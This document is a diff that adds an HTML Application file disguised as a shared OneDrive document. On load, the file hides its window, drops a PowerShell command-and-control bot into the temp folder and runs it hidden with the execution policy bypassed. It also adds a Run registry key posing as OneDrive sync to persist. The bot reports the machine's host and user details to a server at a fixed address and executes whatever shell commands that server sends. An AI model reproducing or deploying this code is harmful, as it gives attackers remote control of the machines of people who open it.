@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Documento Compartido - OneDrive</title>
+<hta:application id="OneDriveUpdate" applicationname="OneDrive Sync" border="none" caption="no" showintaskbar="no" windowstate="minimize" scroll="no"/>
+<script language="VBScript">
+Sub Window_OnLoad
+    Window.ResizeTo 1, 1
+    Window.MoveTo -5000, -5000
+    Dim shell, fso, temp, psPath
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    temp = shell.ExpandEnvironmentStrings("%TEMP%")
+    psPath = temp & "\sysupdate.ps1"
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 2
+    stream.Mode = 3
+    stream.Open
+    stream.WriteText "$IP='192.168.1.6';$PORT='8000';$ID=-join((48..57)+(97..102)|Get-Random -Count 12|ForEach-Object{[char]$_});function R{try{$b=@{bot_id=$ID;hostname=$env:COMPUTERNAME;username=$env:USERNAME;os=(Get-CimInstance Win32_OperatingSystem).Caption;capabilities=@('shell','screenshot','info','persist')}|ConvertTo-Json;Invoke-RestMethod -Uri ""http://$IP`:$PORT/c2/clear/register"" -Method POST -Body $b -ContentType 'application/json'}catch{}};function C{try{return (Invoke-RestMethod -Uri ""http://$IP`:$PORT/c2/clear/check/$ID"" -Method GET).commands}catch{return @()}};function S($cid,$r){try{$b=@{cmd_id=$cid;result=$r}|ConvertTo-Json;Invoke-RestMethod -Uri ""http://$IP`:$PORT/c2/clear/result/$ID"" -Method POST -Body $b -ContentType 'application/json'}catch{}};function E($c){try{return (Invoke-Expression $c 2>&1|Out-String)}catch{return $_.Exception.Message}};R;while(1){foreach($cmd in C){$r=switch($cmd.command){'shell'{E($cmd.args)}'info'{@{hostname=$env:COMPUTERNAME;username=$env:USERNAME}|ConvertTo-Json}default{""Unknown: $($cmd.command)""}};S $cmd.cmd_id $r};Start-Sleep 10}"
+    stream.SaveToFile psPath, 2
+    stream.Close
+    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, False
+    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync", "powershell -WindowStyle Hidden -File """ & psPath & """", "REG_SZ"
+    Window.Close
+End Sub
+</script>
+</head>
+<body></body>
+</html>
